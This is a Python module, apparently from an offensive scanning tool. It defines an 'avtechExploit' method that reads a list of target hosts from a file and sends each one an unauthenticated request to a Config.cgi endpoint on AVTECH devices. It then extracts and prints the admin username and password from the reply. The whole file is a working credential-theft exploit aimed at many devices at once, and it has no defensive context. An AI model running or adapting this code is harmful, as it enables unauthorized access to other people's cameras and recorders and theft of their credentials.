import os, sys, requests
from host import host
class avtech:
    def avtechExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                url = 'http://' + address['ip'] + ':'\
                      + str(address['port']) + '/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*'
                response = requests.get(url)
                if response.status_code == 200:
                    patternUsername = 'Account.User1.Username='
                    patternPassword = 'Account.User1.Password='
                    generalMatch = 'nAccount'
                    userMatch = str(response.content)
                    passMatch = str(response.content)
                    passRaw = passMatch.partition(patternPassword)[2]
                    user = userMatch.partition(patternUsername)[2]
                    username = user.partition(generalMatch)
                    username = username[0]
                    username = username.replace(username[-1], '')
                    password = passRaw.partition(generalMatch)
                    password = password[0]
                    password = password.replace(password[-1], '')
                    print('[-]Found http://' + address['ip'] + ':' + str(address['port']) +
                          ' With credentials ' + username + ' : ' + password)
                elif response.status_code == 401:
                    pass
            except:
                pass
            a += 1
